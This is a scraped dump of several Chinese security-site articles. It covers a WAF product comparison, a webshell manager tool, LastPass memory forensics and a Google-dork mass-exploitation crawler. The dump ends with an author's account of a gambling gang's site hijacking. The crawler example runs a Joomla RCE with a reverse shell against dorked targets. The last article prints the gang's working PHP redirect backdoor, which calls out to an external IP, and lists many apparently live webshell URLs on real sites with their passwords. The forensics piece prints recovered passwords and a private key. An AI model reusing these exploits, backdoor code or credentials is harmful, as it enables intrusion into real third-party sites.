（2）简单抗D功能                （3）抗CC攻击    无 or 很少    必备系统组成模块                （1）web console                （2）检测模块                （3）代理转发模块                （4）数据分析模块    各个模块部署灵活，集群能力强，数据分析模块可以集成到云端，具备大数据分析能力。    多模块集成到一个box，依靠HA bypass等硬件集群形式，比较僵硬。高峰流量时候，容易出现检测模块过载，服务假死的情况，数据分析模块，由于大多管理口不对外无法连接云端。所以很少有厂商集成。代码架构                前后端分离，web端使用Angular等架构，后端使用python等API方式提供给前端                     jsp/php做web console 通过web应用程序直接调用python、sh脚本执行底层代码                 2.3、产品测评 测试项    imperva（NSS Lab）    nsfocus    天融信OSWAP Top 10 漏洞类型检测                     all    all    all准确率                     99.82%                      由于测试脚本原因无法判断好坏    由于测试脚本原因无法判断好坏                 召回率                      0.110%                     由于测试脚本原因无法判断好坏                     由于测试脚本原因无法判断好坏                 CPS(connections per second)                     13,385                      10,000以上                     10,000以上                 稳定性和可靠性：HA bypass                     ok    ok                ok                0×03、产品交互分析 分析To B产品方面交互，其实比较难，因为本身用户就少，体验方面，其实用惯了就好。当然，伴随着SAAS平台的日益兴起，建议在易用方面增加相应的用户体验。     imperva    nsfocus                     天融信                 表现层-视觉设计-用户界面简单易用    *    **    ***架构层-界面设计    **    **    ***架构层-导航设计                     *    ***    ***结构层-交互设计                     *    ***    ***范围层-功能规格-功能逻辑划分明确    **                     ***    ***结论：可以看出产品交互设计方面国内厂商NB，因为国内用户一般都是技术小白。imperva我刚开始看的时候一头露水，要看产品文档才能理解为什么这样设计。显然，进入国内市场还需要在产品交互上多下功夫。0×04、运营及推广策略4.1、运营方面首先如何获得用户体验，这方面nsfocus做的比较好，采用google analytics。4.2、推广方面（1）百度指数imperva 没有买百度指数…（2）公众号     imperva（无公众号）    NSfocus-weixin    TopsecPioneer更新频率    无（主要靠渠道用户开会等方式）    每天3篇    每隔2-4天发一次，每次3-4篇最近文章阅读量最多一篇文章    无（主要靠渠道用户开会等方式）    5557    3324用户数量    无（主要靠渠道用户开会等方式）                     不是订阅号 无法判断    不是订阅号 无法判断                 （3）微博号     imperva                     NSfocus                     Topsec                 粉丝    443                     10000    2475                 文章    239                     1178    534","2016-10-08 13:24:27","Web安全","Web应用防火墙（WAF）竞品分析","http://nsoad.com/Article/web/20161008/496.html"
"5ccbfb344f2f0a0a7a69c12a","前言工具名称开山斧0.3.5重要的事情提前说软件跨平台，并且已经开源，不用担心有后门，也可以根据自己的需求进行功能二次开发。或者反馈给他们，作者很靠谱。目前支持语言P","silence","前言工具名称开山斧0.3.5重要的事情提前说软件跨平台，并且已经开源，不用担心有后门，也可以根据自己的需求进行功能二次开发。或者反馈给他们，作者很靠谱。目前支持语言PHP ASP ASPXGIT开源地址https://github.com/pyqteval/ 功能介绍system\Server.ini  软件配置信息[add_shell]{添加数据时保存默认配置信息}checkbox = 0type_id = 3script = 1coding = 1pass_checkbox = 1[link_except]{链接错误弹出窗口自动关闭时间秒}close_form = 5[Action]{同意软件使用说明}declaraction = 1file_property = 0666_232,232,232|0777_105,105,105|0000_54,54,54     {根据文件属性更改背景色}file_format = .exe_255,0,0|.htm_30,144,255|.html_30,144,255|.jpg_124,252,0     {根据文件后缀更改文字颜色}支持检测防火墙system\firewall.txt样式：eval_safedog_firewall|www.safedog.cneval_huweishen_firewall|huweishen.comeval_360_firewall|360.cn支持自定义代码system\Web_Customizeasp.xmlaspx.xmlphp.xml软件提交动作代码！可以用户自定义代码！程序的自定义代码功能可以用来做另外一种免杀，免去修改软件本身过waf的烦恼!IP数据库定位更准确system\ip_db使用了两种ip数据库1.IP纯真数据库2.GeoLite2数据库软件图标自定义修改这方法就不过详细介绍自己琢磨！system\country_ico当链接webshell以后会自主根据IP分配国家图标！system\file_ico文件图标目录软件界面可以自己更换软件是使用QT中的UI作为界面!本工具为了使广大用户感觉视觉效果，加载了图标包和皮肤包！下载地址：http://eval.webxscan.com/download/win_0.3.5.rar来几张图片：]软件更新会在网站上有发布免责申明该软件仅限用于学习和研究目的；不得将本软件用于商业或者非法用途，否则，一切后果用户自负。","2016-10-17 16:18:01","安全工具","国产“一句话”管理工具：开山斧","http://nsoad.com/Security-tools/20161017/tools-582.html"
"5ccbfb344f2f0a0a7a69c12b","写在前面的话首先我要声明的是，我这篇文章中所要描述的内容并没有涉及到LastPass的漏洞，而且整个过程也与漏洞利用无关。在这篇文章中，我准备告诉大家如何在信息取证的","Kong","写在前面的话首先我要声明的是，我这篇文章中所要描述的内容并没有涉及到LastPass的漏洞，而且整个过程也与漏洞利用无关。在这篇文章中，我准备告诉大家如何在信息取证的过程中尽可能地从内存中提取出我们所需要的数据，而且在某些情况下，我们还得要求这些数据必须是明文形式的有效数据。最近，我正在阅读《内存取证的艺术》这本书[购买地址]，如果你对数据取证这一方面感兴趣的话，那么这本书是我强烈推荐的。在本书的部分章节中，作者对如何从浏览器中提取出用户密码进行了讨论。当你使用标准的登录方式来登录某个网站时，你所输入的用户名和密码将会以POST请求的形式发送至远程Web服务器。而需要注意的是，此时你的用户名和密码均是以明文的形式发送的。在此，我并不打算讨论关于SSL的内容，其实在SSL内部，这些数据仍然是明文形式的。接下来，本书的作者继续讲述了如何定位这些POST请求，并尝试将这些请求数据提取出来。如果你刚好“逮到”了一个刚刚完成登录操作的浏览器，那么这种方法对你来说可能会非常有用。但如果用户使用了一个session（会话）来进行登录的话，那么你可能就无计可施了。在我阅读本书的过程中，我无意中看了一眼我的浏览器，我发现我的LastPass插件图标上显示了一个数字1。这也就意味着LastPass已经帮我把当前这个域名的登录凭证保存下来了。正常情况下，如果我访问了某个网站的登录页面，而我又开启了浏览器的“自动填写表单”功能，那么LastPass就会自动将该域名的凭证数据填写至登录表单中，然后浏览器将会通过POST请求来发送这些凭证数据。当然了，前提是我已经将该域名的凭证保存在LastPass中了。但是我现在想要弄清楚的是，LastPass中存储的凭证数据到底是何时被解密的。是当页面中出现了表单域的时候呢，还是当域名被加载完成的时候？于是我准备搭建一个测试环境，让我们来看一看真相到底是什么！环境搭建我想要在内存中完成所有的操作，所以我必须找到一种简单的、可重复进行的方法来实现在内存中搜索数据。最简单的方法就是当我每次对浏览器进行了修改操作之后，立刻进行一次内存转储（mem dump）。在虚拟机的帮助下，我只需要在每次修改之后创建一个快照（snapshot）就可以了。这样一来，每次修改之后我都能够得到一份内存数据的拷贝，然后就可以进行数据对比了。接下来，我要安装几个目前最为常用的浏览器，例如Chrome、IE、或者火狐。然后配置好Lastpass插件（全部采用默认配置），并且使用该插件来生成并存储不同长度的密码，所有的密码都只包含字母与数字。除此之外，我还将所有的这些密码全部拷贝到了一份文档内，并将其保存在主机中。完成这些操作之后，我退出了所有的账号，清除了浏览器的历史记录和临时文件，并且重启了设备。实验方法环境的搭建算是比较简单的了，但是实验过程可能会稍微有点复杂。实验的操作步骤大致如下：1. 打开浏览器2. 登录LastPass插件3. 登录网站4. 检查内存中是否出现了明文密码5. 完成修改操作（关闭网页标签、恢复网页标签、注销）6. 不断重复这些操作实验一首先，我打开了第一个网站—Facebook，然后登录了一个临时的Facebook账号。当我登录成功之后，我又访问了好几个其他的Facebook页面。这一系列操作完成之后，我并没有关闭这些网页标签，而是直接创建了一个快照。第一次，   我打算搜索一些比较简单的东西，命令如下：grep -a 03rRJaYNMuoXG7hs Win7x64-MemTesting-Snapshot3.vmem | strings &gt; ~/Desktop/fb.txt“-a”参数可以让grep命令把我的导出的内存文件当作文本文件来处理，而且在我们将输出的数据写入至文本文件之前，还要对字符串进行一些简单的处理。我们所获取到的输出数据的确包含一些有价值的信息，具体如下图所示：当我获取到这些数据之后，首先抓住我眼球的就是下面这两段数据：这是一个JSON对象，其中包含有用户密码、网站域名、时间戳、以及其他的一些数据。从表面上看，这些数据似乎与浏览器自动填写表单域所使用的数据有关。{""reqinfo"":{""from"":""fillfield_A"",""index"":28,""time"":1475875701411,""uniqid"":85097549},""docid"":0,""sharedsite"":0,""automaticallyFill"":1,""is_launch"":false,""manualfill"":false,""name"":""pass"",""value"":""O3rRJaYNMuoXG7hs"",""type"":""password"",""checked"":false,""otherfield"":false,""doconfirm"":1,""allowforce"":0,""from_iframe"":0,""humanize"":false,""v2humanize"":false,""delayquants"":0,""force_fillbest"":false,""originator"":""FILL_F4"",""cmd"":""fillfield"",""clearfilledfieldsonlogoff"":0,""dontfillautocompleteoff"":0,""realurl"":""https://www.facebook.com/"",""aid"":""607245038900433242"",""tabid"":2,""custom_js"":"""",""domains"":""facebook.com,facebook.com,messenger.com"",""formname"":"""",""topurl"":""https://www.facebook.com/"",""urlprefix"":""chrome-extension://hdokiejnpimakedhajhdlcegeplioahd/"",""lplanguage"":""""}接下来的这部分数据我也看不出有什么端倪。passO3rRJaYNMuoXG7hspassword实验二在第二个实验中，我访问了好几个不同的网站，并且均登录了相应的账号，然后在重启系统前注销了所有的账号。除此之外，我还要确保浏览器没有保存任何的数据，所以我必须要清除浏览器中所有的历史记录、cookie信息、以及表单内容等数据。你可以在下面这张截图中看到，所有的网页标签都已经加载完毕了，而且除了QNAP网站之外，其他的网站均已登录了相应的账号。我进入到QNAP的主页，然后你就可以看到，LastPass插件将会提醒我它检测到了一个匹配成功的用户凭证，但是我现在却并没有加载任何包含表单域的网页，所以现在并没有任何需要进行“自动填写”的东西。此时我需要创建一个快照。接下来，我在刚刚创建的快照中使用了与之前相同的grep命令，并且在内存中对所有刚刚访问过的网站进行了一次搜索。结果证明，我刚刚所有登录过的网站在内存中使用的都是相同的数据结构。具体数据如下所示：{""reqinfo"":{""from"":""fillfield_A"",""index"":157,""time"":1475878291419,""uniqid"":65765520},""docid"":0,""sharedsite"":0,""automaticallyFill"":1,""is_launch"":false,""manualfill"":false,""name"":""ca414a13646af9ceb5293a5eeded1704"",""value"":""5DAhhkOvZDTC0MYA14"",""type"":""password"",""checked"":false,""otherfield"":false,""doconfirm"":1,""allowforce"":0,""from_iframe"":0,""humanize"":false,""v2humanize"":false,""delayquants"":0,""force_fillbest"":false,""originator"":""FILL_F4"",""cmd"":""fillfield"",""clearfilledfieldsonlogoff"":0,""dontfillautocompleteoff"":0,""realurl"":""http://androidforums.com/login/login/register"",""aid"":""5988558277865511241"",""tabid"":14,""custom_js"":"""",""domains"":""androidforums.com"",""formname"":"""",""topurl"":""http://androidforums.com/"",""urlprefix"":""chrome-extension://hdokiejnpimakedhajhdlcegeplioahd/"",""lplanguage"":""""}除此之外，我还注意到了一些其他的数据结构。{""cmd"":""save"",""url"":""https://www.phpbb.com/community/ucp.php?mode=login"",""formdata"":""login\tusername\tpeters.lastpass%40gmail.com\ttext\tseen\nlogin\tpassword\tSG5P2GRgqYeL4nvzi8C1XnZs\tpassword\tseen\nlogin\tautologin\ton-0\tcheckbox\tseen\nlogin\tviewonline\ton-0\tcheckbox\tseen\nlogin\tredirect\t.%2Fucp.php%3Fmode%3Dlogin\thidden\tnotseen\nlogin\tsid\t32ff2e6ecf53aaac43b88f123ad86b04\thidden\tnotseen\nlogin\tredirect\tindex.php\thidden\tnotseen\n0\taction\thttps%3A%2F%2Fwww.phpbb.com%2Fcommunity%2Fucp.php%3Fmode%3Dlogin\taction\n0\tmethod\tpost\tmethod\n"",""current_pw_field_name"":"""",""docnum"":0,""timestamp"":1475878195546,""username"":""[email protected]/*  */"",""password"":""SG5P2GRgqYeL4nvzi8C1XnZs"",""tld"":""phpbb.com""}我们可以看到，在上面这段数据中包含有用户名、网站域名、以及用户密码，而且这些数据全部是明文形式的。此前，虽然QNAP网站已经加载完成了，但是我们既没有填写该网站的任何表单，也没有进行登录操作，所以内存中并没有关于该网站的数据。接下来，我打算继续在内存中进行搜索，看看能不能找到其他的一些有用数据。在搜索的过程中，我突然发现了一段非常有意思的信息。这是一段被标记为“LastPassPrivateKey”的数据。当我获取到这些数据之后，我便开始尝试去使用这部分数据来获取主密码。不仅如此，我也想看看是否能够使用这部分数据来解密我们在内存或者硬盘中所发现的文件。当我在思考如何去利用这个“私钥”的时候，我突然意识到了一件事情—我到现在都还没有尝试在内存中搜索或查找主密码，说不定内存中就包含有主密码呢？虽然在grep命令的帮助下，我成功地在内存中找到了明文形式的用户名和密码，但是我只在其中的一个快照中找到了这些数据。我接下来的任务就是不断地打开、关闭、恢复网页标签，在完成了这一系列操作之后，我得出了一个结论：如果网页标签加载完毕，并且成功登录网站的话，大多数情况下我们都可以在内存中找到用户的登录凭证。但是，在不断地打开或者关闭网页标签之后，我们将很难再在内存中找到完好无缺的数据结构了。虽然这些数据仍然保存在内存中，但是如果你不知道你所要找的数据是什么的话（无论是数据值还是数据结构），你几乎是不可能在内存中找到它们的。为此，我们就得使用Volatility插件来从内存中提取出这些凭证数据了。这个插件可以使用YARA规则来从内存中自动化提取出我们所需要的数据，有关该插件的内容可以参阅这篇文章[点我阅读]。我搜索到的数据结果如下所示：[email protected]/*  */:~$ vol.py --plugins=/home/localadmin/github/volatility_plugins/lastpass --profile=Win7SP1x86 -f /home/localadmin/Desktop/lastpass-mem.vmem lastpassVolatility Foundation Volatility Framework 2.5Searching for LastPass SignaturesFound pattern in Process: chrome.exe (3400)Found pattern in Process: chrome.exe (3400)Found pattern in Process: chrome.exe (3400)Found pattern in Process: chrome.exe (3400)Found pattern in Process: chrome.exe (3400)Found pattern in Process: chrome.exe (3400)Found pattern in Process: chrome.exe (3400)Found pattern in Process: chrome.exe (3400)Found pattern in Process: chrome.exe (3400)Found pattern in Process: chrome.exe (3400)Found pattern in Process: chrome.exe (3400)Found pattern in Process: chrome.exe (3400)Found pattern in Process: chrome.exe (3840)Found pattern in Process: chrome.exe (3840)Found pattern in Process: chrome.exe (3840)Found pattern in Process: chrome.exe (3840)Found pattern in Process: chrome.exe (3912)Found pattern in Process: chrome.exe (3912)Found pattern in Process: chrome.exe (3912)Found pattern in Process: chrome.exe (3912)Found pattern in Process: chrome.exe (3912)Found pattern in Process: chrome.exe (3912)Found pattern in Process: chrome.exe (4092)Found pattern in Process: chrome.exe (4092)Found pattern in Process: chrome.exe (4092)Found pattern in Process: chrome.exe (4092)Found pattern in Process: chrome.exe (2036)Found pattern in Process: chrome.exe (2036)Found pattern in Process: chrome.exe (2036)Found LastPass Entry for hackforums.netUserName: peters.lastpassPasword: jRvTpQoTHS4OTclFound LastPass Entry for facebook.comUserName: [email protected]/*  */Pasword: UnknownFound LastPass Entry for sainsburys.co.ukUserName: [email protected]/*  */Pasword: mt5JwaPctWFzBjFound LastPass Entry for leakforums.netUserName: peterslastpassPasword: rmH61HSabrVJ9a2Found LastPass Entry for facebook.com,facebook.com,messenger.comUserName: UnknownPasword: O3rRJaYNMuoXG7hsFound Private KeyLastPassPrivateKey&lt;308204BD020100300D06092A864886F70D0101010500048204A7308204A30201000282010100D0D534BEA030F199144DD4B1B0A69D6462BC13CF074B77CDEC0B4C06D3773B39F0D3353D58732D35809E2A45C9A70B94C366DE4E8B591178F5366A4328C96A82A51E8B1573A9546F859EA6C13EB1E08F1F69749598429244B96AFCAE0787CFC4CC19311D80F90679CE4C395FDBF22F9201381E0AEC345C724E1E61CE8EEE0A37EE38B04D5EEA1AB2562D815242E4D6379D23940ACD800921853787F0F1B37F249DE284780CE1D1FFF10FFCE778CD03A442C7A487C47A27D4F11EE98CF5E8B2AA8A7DEE0710B9C2D430CB33EC747E37298E16103493C6DF8A539F4893F30CCFA74D84E5FC40E1ED39316EA038D16748F58AE873704DD61B028940ECB083E7F1790940D4BD2A01C73DBA4AC26A2BB98CE7A2CDF02011102820100624636F04B62539354D955085321324102818100D05799FCC7514DBFC0DEC6E06E2A8715E9E46911DBBFCC59F1569A82930FDBD195A685C1BF13EABB75B46CC8484EB3771E102E76CE3D3756CEF13666C6581861EE23EC11ABB658BA2F815EF2D406FDD85830F6B599443004CEA4B1A79DAAAAEE86755FE354498C770EF3BE2077DD19EE3E7E53A9935FC0D76BD90D3B887F50575FA01A617A43F5D2C44815098207299381229DDA8F91713B7012D8F29A087A3918A2F76A222BA4202E8A0997D63D1EEF02F246DC0A5C0AC869191B9231DCD6D657FB4E6591DDFAF3026522F84E2D1EF2D5C05289EFF9D7E2F2A722374E0204C8FAA326024DF520B97505146AFB1AF7469B862977B1152430911BFA112E76A51C352D7F1B2C39669B4CF102818100FCFCA8B2F2074C1FB357A859AA583651D5DC9EA0446E0B33A7B41D9B7C9955832BEFB4E2151D17DDB851A1F46B16E26ECC6515BCB1C802DD73DA4ACD89083168E2678DE363EF1B45BAA1BA40F845D8396AFC269503F9A4F04D39271F02819A665D47036F0CA3628D78987102818100CEFC910EF956B3590A9A0907F59EB44CD25FF10032DAFE48C359057F75FBA5AF1CC1C6E11E37CF4F825D0E1540B5DA77FF6777FEE55621C1D0EF85D3C12702150D542A90CC8021FA132EF383835DA4358A0781E168897C779F2DA6A834DA20DBFDA4F643738B4DF6BBDD768947D9EC577466E18100D351EC8A77C7582E0A78C5ACA9D86068BB82D721B0841962F959A25A01FA80FFB765DE228798&gt;LastPassPrivateKeyFound Private KeyLastPassPrivateKey&lt;\x00\xb2\x88\x10\x02N;$\x02&amp;\x00\x00\x00&gt;LastPassPrivateKey[email protected]/*  */:~$","2016-10-20 02:01:26","系统安全","手把手教你如何从内存中提取出LastPass的用户凭证","http://nsoad.com/Article/system/20161020/608.html"
"5ccbfb344f2f0a0a7a69c12c","这是一款基于谷歌搜索引擎的自动化爬虫。爬虫介绍爬虫大体机制就是：先进行一次谷歌搜索，将结果解析为特定格式，然后再提供给exp使用。大家可以尝试使用&ndash;help来列出","silence","这是一款基于谷歌搜索引擎的自动化爬虫。爬虫介绍爬虫大体机制就是：先进行一次谷歌搜索，将结果解析为特定格式，然后再提供给exp使用。大家可以尝试使用–help来列出所有参数。这个项目笔者会持续更新，以后再添加新的exp进行升级。此外，它会利用google_parsers模块去构建exp解析搜索结果，所以当你开始搜索时，可以选择“–exploit parser”参数来指定相应exp。google parsers模块（google_parsers.py）以后还会继续优化，而现在的exp只含有joomla cve，毕竟这个项目主要是给大家自己diy使用的。但是，如果你不会弄exp，把利用exp提交给过来也行。由于笔者平时还是比较忙，所以没有太多时间去手动搜索目标。故而，笔者尝试使用Selenium框架去造了个爬虫来搜寻测试目标。至于搜索过程中出现的Google的验证码，它需要其他库和模块来辅助解决。在项目里使用Selenium后，大家就可以在谷歌出现验证码的是时候，自行手动输入验证码，然后爬虫就可以继续爬行了。这大概是笔者能想出的最好的解决验证码防护的办法了。简单概述下爬虫是如何工作的：1. 执行谷歌搜索2. 从每一页解析结果3. 测试是否结果中含有漏洞依赖与需求这个项目需要python3，使用requirements安装依赖库的方法如下：$ sudo pip install -r requirements.txt运行示例：python3 google_explorer.py --dork=""site:*.com inurl:index.php?option="" --browser=""chrome"" --exploit_parser=""joomla_15_12_2015_rce"" --revshell=""MY_PUBLIC_IP"" --port=4444 --google_domain=""google.com"" --location=""França"" --last_update=""no último mês""在上面的例子里，笔者是在寻找法国的joomla RCE目标，使用的是google_domains.txt里面的google域名（比如google.co.uk）来作为搜索引擎，“–last_update”则代表着搜索结果的更新时间为上个月。上面例子里的选项适用于任何语言，主要决定于google针对相应的国家给出的语法。下面再给出一个简单的例子：python3 google_explorer.py --browser='chrome' --dork='site:gob.ve inurl:index.php' --location=""Venezuela""当然，这些exp也是可以单独使用的：$ cd xpl_parsers$ python joomla_cve_2015_8562.py单独测试exp的方法：$ cd exploits$ python exploiter.py --file &lt;vuln file&gt;","2016-11-10 20:09:40","安全工具","好用的Google漏洞爬虫：Google Mass Explorer","http://nsoad.com/Security-tools/20161110/tools-737.html"
"5ccbfb344f2f0a0a7a69c12d","起因对这件事情的起因是某天我渗透了一个大站，第二天进webshell时就发现，当前目录出现了新的后门，仔细一查，发现是博彩团伙干的，网站被全局劫持黑帽程序如下代码set_","blackhold","起因对这件事情的起因是某天我渗透了一个大站，第二天进webshell时就发现，当前目录出现了新的后门，仔细一查，发现是博彩团伙干的，网站被全局劫持黑帽程序如下代码set_time_limit(20);error_reporting(0);define('u_b','/');define('s_u','http:// 107.182.228.74/');define('s_s','@haosou.com|360.cn| [email protected]&lt;script data-cfhash='f9e31' type=""text/javascript""&gt;/*  */&lt;/script&gt;');define('h_t',$_SERVER['SERVER_NAME']);define('r_s',$_SERVER['HTTP_REFERER']);define('u_s',$_SERVER['HTTP_USER_AGENT']);define('h_z',s_p());function s_p(){$d='';if(isset($_SERVER['REQUEST_URI'])){$d=$_SERVER['REQUEST_URI'];}else{if(isset($_SERVER['argv'])){$d=$_SERVER['PHP_SELF'].'?'.$_SERVER['argv'][0];}else{$d=$_SERVER['PHP_SELF'].'?'.$_SERVER['QUERY_STRING'];}}if(isset($_SERVER['SERVER_SOFTWARE']) &amp;&amp; false!==stristr($_SERVER['SERVER_SOFTWARE'],'IIS')){if(function_exists('mb_convert_encoding')){$d=mb_convert_encoding($d,'UTF-8','GBK');[email protected]&lt;script data-cfhash='f9e31' type=""text/javascript""&gt;/*  */&lt;/script&gt;('GBK','UTF-8',@iconv('UTF-8','GBK',$d))==$d?$d:@iconv('GBK','UTF-8',$d);}}$r=explode('#',$d,2);$d=$r[0];return $d;}function r_s($url){$o=array('http' =&gt; array('method'=&gt;""GET"",'timeout'=&gt;8));$context=stream_context_create($o);$h=file_get_contents($url,false,$context);if(empty($h)){$h=file_get_contents($url);}return $h;}if(preg_match(s_s,r_s)){$d_s=true;if(preg_match(""@[email protected]&lt;script data-cfhash='f9e31' type=""text/javascript""&gt;/*  */&lt;/script&gt;"",r_s)){setcookie('xx',h_t,time()+259200);$d_s=false;}if($d_s ){setcookie('xx',h_t,time()+259200);$d_u=s_u.'?xu='.bin2hex(h_z);$d_u.='&amp;ad=1&amp;xh='.bin2hex(h_t);$d_c=r_s($d_u);header(""Location: "".$d_c.'?'.h_t);exit;}}if(strstr(h_z,u_b)){if(preg_match(s_s,u_s)){$d_u=s_u.'?xu='.bin2hex(h_z);$d_u.='&amp;xh='.bin2hex(h_t);$d_c=r_s($d_u);echo $d_c;exit;}}https://www.so.com/s?q=%E5%A8%B1%E4%B9%90%E5%9C%BA&amp;src=srp&amp;fr=360sou_newhome&amp;adv_t=d看上去是针对360的，通过360去搜索site网站赌博相关的关键字出现的结果我惊呆了！！！！居然非常多的站被劫持，而且其中包括我渗透测试的不少站，看上去像是搜索引擎自己控制的排名一样，其实是非法分子利用了搜索引擎的排名算法规则。通过收录时间发现在2014年开始出现的，也就是说这个问题已经存在了多年之久，至今才暴露出来。接下来我就开展了所有疑问的调查，因为这些东西被利用对社会影响实在太大，不仅仅我是唯一的受害者，而是这个安全圈子的所有人。调查找到幕后团伙查大马问题分析团伙的后门特征1.我对我手里的shell进行了一遍梳理，首先是对后门进行新的地址修改，在原来的后门地址放上了js代码，该段代码记录的是相关指纹信息，以及各大网站的json获取。此时就是静静的等待。2．我对大马又进行了一遍分析，把所有代码读烂了也没任何问题，同时也对马进行了抓包分析，没有任何外部请求。因为一直没发现问题，所以我特意进行了长达一周的数据包监控，还是没有任何结果。这时候就非常纳闷，既然马没有问题，为什么人家可以获取到我的所有后门？难道是我的电脑被入侵？我的网络环境除了http之外，不能做任何协议请求，而我的后门都保存在这台linux里，这点也可以排除。只好再想想是不是哪里疏忽了。3.被该团队劫持过的站，我都检查了一遍，之后我发现，每个站的所有文件创建时间都会被他们更新到入侵时间，这刚好符合了特征，也就是刚被他们入侵过的站。如图特征，几乎每个站被入侵后所有创建时间都会更新一次。之后对他们自己的后门进行了采集样本，新的进展出现了，一共发现2波不同的团伙，但使用的大马均为一类。（见附件1）我对他们的马进行了解密审计后发现，他们自己记录大马后门的箱子地址为api.fwqadmin.com，因为有了新的线索，所以只能暂时保存，后面再对这个进行渗透。进展经过两天的等待，终于得到了该团伙的指纹信息以及QQ号，然后我就开启大神模式进行社工，之后基本确认此人真实信息（圈内叫老袁）。然后我申请了一个QQ小号，以匿名的方式加了一些博彩导航网站上的qq，在QQ上问了好几个人，都没有结果，后来我干脆以做博彩的名义和他们进行深度沟通，通过沟通发现该团伙的shell都是收购来的，一个月收入几百万人民币，是否真实就不得而知了。目前基本可以确认我的判断错误，老袁就是唯一的线索。我对被该团伙做劫持的所有站进行了采集，还有跳转到他们导航的域名。首先对那些不是我的站进行了渗透入侵，采集到后门样本，看到里面有个和我类似的大马，但是核心变量结构不一样，我下载回来进行审计抓包同样没问题，后来通过对比特征，发现大马请求的POST参数都是一样的，例如gopwd=密码&amp;godir= ，马都没异常，这时候初步判断是上层网络出现了问题，通过流量提取到大马特征的地址，如果真是这样就太可怕了。 我联系到老袁了，和他进行了一些盘问式的沟通，感觉到他很害怕，他说别搞他，他以前做诈骗的。后来发了一些shell地址给我来讨好我，如下列表，下面是星际团队的：http://www.copperhome.net/file/avatar/31/cb/index.php?1=1&amp;f=k        HyhbokskjGrsjhjM8hsL_hgshgKhttp://www.212200.com/mocuz/downapp/images/pclife.php?1=2&amp;Z=Opm    Hys7sa5wrKKO00GSBtashras28asNNmsn18http://www.dailiba.com/about/index.php?v=1                Tmbdcuu123uualltophttp://www.chinaunix.net/mysql/tmp/hoem.php?1=1&amp;f=k                HyhbokskjGrsjhjM8hsL_hgshgKhttp://domarketing.org/phpsso_server/caches/commons/index.php?v=2ss        ytsadAskLs27ssJsjdasd2sShttp://www.baby-edu.com/member/admin/include/fields/box/index.php?v=qw            ytsadAskLs27ssJsjdasd2sShttp://www.hongze365.com/data/avatar/1/f/1.gif?1=2&amp;GSW=Curry            TTrsfsdh748jsusyKKOystw889sbcthttp://www.xiashanet.com/Head_Foot/bak/top900x40.php?1=2&amp;BAT=HEHEDE            77iasyw00aUUSImmsb64682301jMM!!!Qkohttp://www.hbmykjxy.cn/2015/0106/4589.php?1=2&amp;GSW=Curry            TTrsfsdh748jsusyKKOystw889sbcthttp://www.copperhome.net/file/avatar/31/cb/index.php?1=1&amp;f=k        HyhbokskjGrsjhjM8hsL_hgshgKhttp://www.dailiba.com/about/index.php?v=1                Tmbdcuu123uualltophttp://www.hubeifc.com/phpcms/modules/content/classes/commentl_api.class.php        UTF8http://domarketing.org/phpsso_server/caches/commons/index.php?v=2ss        ytsadAskLs27ssJsjdasd2sShttp://www.huse.edu.cn/phpsso_server/phpcms/languages/en-us/condif.inc.php?v=sd        ytsadAskLs27ssJsjdasd2sShttp://www.xiashanet.com/Head_Foot/bak/top900x40.php?1=2&amp;BAT=HEHEDE            77iasyw00aUUSImmsb64682301jMM!!!Qkohttp://www.hbmykjxy.cn/2015/0106/4589.php?1=2&amp;GSW=Curry            TTrsfsdh748jsusyKKOystw889sbcthttp://www.hongze365.com/data/avatar/1/f/1.gif?1=2&amp;GSW=Curry            TTrsfsdh748jsusyKKOystw889sbcthttp://bbs.fish3000.com/mobcent/app/config/discuz.bak.php?1=2&amp;TD=SAS            UUys78tasdRhasd00iasdyTGGgahshttp://bbs.dqdaily.com/uc_server/install/images/close.php?1=2&amp;sha=shan            7yJJN730%1&amp;uqYYqwhkkasII17vcxQ1mzaPQhn8!Phttp://www.aquasmart.cn/member/fckeditor/editor/css/friend.php?1=1&amp;f=k                HyhbokskjGrsjhjM8hsL_hgshgKhttp://www.yangji.com/member/editor/fckeditor/editor/dtd/fck_dtd_test.gif?1=2&amp;BAT=HEHEDE    77iasyw00aUUSImmsb64682301jMM!!!Qkohttp://www.shenma66.com/nvzhubo/baorurekuxiongmiaonvzhuboMinanaxingganrewuzhiboshipin/inde.php        7yhaw1woAksmjh892jsasd1sajghttp://www.shenma66.com/nvzhubo/baorurekuxiongmiaonvzhuboMinanaxingganrewuzhiboshipin/inde.php        7yhaw1woAksmjh892jsasd1sajghttp://bbs.taisha.org/pms/data/templates/wind_homes.tpl.php?baidu=Google        erk12hj3nfher71h3j4k132bnnebr3hg4134http://www.168w.cc/api/map/baidu/baidu.php?1=1&amp;f=k                    HyhbokskjGrsjhjM8hsL_hgshgKhttp://www.dibaichina.com/goldcard/data/alliance/images/GHMC.php?1=1&amp;baidu=.com    Tmbdcuu123uualltophttp://www.ijcz.cn/module/brandjoin/join.claos.php?1=2&amp;BK=ManUtd            YIasdwj78954qwtyVVJsarwhahuyrwvsllps2http://www.xiashanet.com/Head_Foot/bak/top900x40.php?1=2&amp;BAT=HEHEDE            77iasyw00aUUSImmsb64682301jMM!!!Qkoshttp://www.hotpoll.com.cn/i/index.php?v=111   heiheideheihei星际团队是什么鬼？难不成又是做博彩的？通过与老袁进一步沟通后发现，这些shell都是另一个做博彩的，他说是博彩圈子最大的团伙，说实话，我挺兴奋的，发觉这件事越来越有趣了，我倒想看看这是些什么人。不过现在我的目标还在“老袁”身上，因为我得找到卖他shell的人，经过一番较量之后，我得到到了真相，我也叫他提供了交易证据。此处略去不表，我会放到后面取证部分。虽说有了shell卖家的联系方式，可是迟迟没添加上。这时候我又采取了另一种思路，钓鱼取证，老套路，还是在大马地址上js json，上面贴了几段字《add me email:[email protected]&lt;script data-cfhash='f9e31' type=""text/javascript""&gt;/*  */&lt;/script&gt; I will give you all 